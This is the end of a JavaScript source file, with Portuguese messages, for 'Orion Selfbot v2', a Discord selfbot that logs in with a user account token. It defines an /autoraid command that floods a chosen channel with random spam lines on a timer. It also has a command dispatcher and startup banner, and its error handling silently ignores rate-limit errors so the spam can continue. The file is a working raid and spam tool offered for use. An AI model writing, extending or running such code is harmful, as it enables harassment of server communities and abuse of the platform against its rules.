  }

  let channel;
  try {
    channel = await client.channels.fetch(channelId);
  } catch (e) {
    return msg.reply('❌ Canal invalido.');
  }

  const spamLines = loadSpamLines();
  autoRaidActive = true;

  autoRaidInterval = setInterval(async () => {
    try {
      const line = spamLines[Math.floor(Math.random() * spamLines.length)];
      await channel.send(generatePollutedMessage(line));
      log('raid', `[AutoRaid] Mensagem enviada para #${channel.name}`);
    } catch (e) {
      log('error', `[AutoRaid] Erro: ${e.message}`);
    }
  }, interval);

  await msg.reply(`🔁 **Auto Raid ativado!**\n📨 Canal: #${channel.name}\n⏱ Intervalo: ${interval}ms\n\nUse \`/autoraid\` para parar.`);
  log('cmd', `/autoraid -> #${channel.name} a cada ${interval}ms`);
}, { usage: '/autoraid <channel_id> [intervalo_ms]', desc: 'Auto raid com intervalo' });

// ─── MESSAGE HANDLER ─────────────────────────────────────────────────────────
client.on('messageCreate', async (msg) => {
  // Ignore messages from other bots and self
  if (msg.author.bot) return;
  if (msg.author.id !== client.user.id) return;

  // Check prefix
  if (!msg.content.startsWith(PREFIX)) return;

  const args = msg.content.slice(PREFIX.length).trim().split(/ +/);
  const cmdName = args.shift().toLowerCase();

  const cmd = commands.get(cmdName);
  if (!cmd) {
    // Try to find closest match
    const similar = [...commands.keys()].filter(k => k.startsWith(cmdName) || cmdName.startsWith(k));
    if (similar.length > 0) {
      msg.reply(`❌ Comando "${cmdName}" nao encontrado.\nTalvez voce quis dizer: \`${PREFIX}${similar[0]}\``);
    } else {
      msg.reply(`❌ Comando "${cmdName}" nao encontrado. Use \`${PREFIX}help\` para ver os comandos.`);
    }
    return;
  }

  // Log command
  log('cmd', `${msg.author.tag} usou ${PREFIX}${cmdName} ${args.join(' ')}`);

  try {
    await cmd.fn(msg, args);
  } catch (e) {
    log('error', `Erro executando ${cmdName}: ${e.message}`);
    msg.reply(`❌ Erro executando \`${cmdName}\`: \`${e.message}\``);
  }
});

// ─── READY EVENT ────────────────────────────────────────────────────────────
client.on('ready', async () => {
  console.clear();
  console.log(chalk.red.bold(`
██████  ██████  ██ ██████  ██    ██
██   ██ ██   ██ ██ ██   ██ ██    ██
██████  ██████  ██ ██████  ██    ██
██   ██ ██   ██ ██ ██   ██ ██    ██
██   ██ ██   ██ ██ ██   ██  ██████
  `));

  const user = client.user;
  const guildCount = client.guilds.cache.size;
  const userCount = client.users.cache.size;

  console.log(chalk.cyan('✦═══════════════════════════════════════✧'));
  console.log(chalk.white(`  Orion Selfbot v2`));
  console.log(chalk.white(`  Logado como: ${chalk.green.bold(user.tag)}`));
  console.log(chalk.white(`  ID: ${chalk.yellow(user.id)}`));
  console.log(chalk.white(`  Servidores: ${chalk.magenta(guildCount)}`));
  console.log(chalk.white(`  Usuarios: ${chalk.magenta(userCount)}`));
  console.log(chalk.white(`  Comandos: ${chalk.cyan(commands.size)}`));
  console.log(chalk.white(`  Prefixo: ${chalk.red(PREFIX)}`));
  console.log(chalk.cyan('✦═══════════════════════════════════════✧'));
  console.log(chalk.green(`\n  ✅ Orion Selfbot pronto! Use /help nos DMs.`));
  console.log(chalk.gray(`  Modo: Selfbot (funciona sem estar no servidor)\n`));

  // Set initial status
  try {
    await user.setPresence({
      activities: [{
        name: CONFIG.status_text || 'Orion v2 | /help',
        type: CONFIG.status_type?.toUpperCase() || 'PLAYING'
      }],
      status: 'dnd'
    });
  } catch (e) {}

  log('ok', `Orion Selfbot iniciado com sucesso!`);
});

// ─── ERROR HANDLING ─────────────────────────────────────────────────────────
client.on('error', (e) => {
  log('error', `Client error: ${e.message}`);
});

process.on('unhandledRejection', (e) => {
  if (e.message?.includes('rate')) return;
  log('error', `Unhandled: ${e.message}`);
});

// ─── START ──────────────────────────────────────────────────────────────────
if (TOKEN === 'SEU_TOKEN_AQUI') {
  console.log(chalk.red('\n❌ ERRO: Configure o token no arquivo config.json!\n'));
  process.exit(1);
}

log('info', 'Iniciando Orion Selfbot...');
client.login(TOKEN).catch(e => {
  console.log(chalk.red(`\n❌ ERRO AO LOGAR: ${e.message}\n`));
  process.exit(1);
});
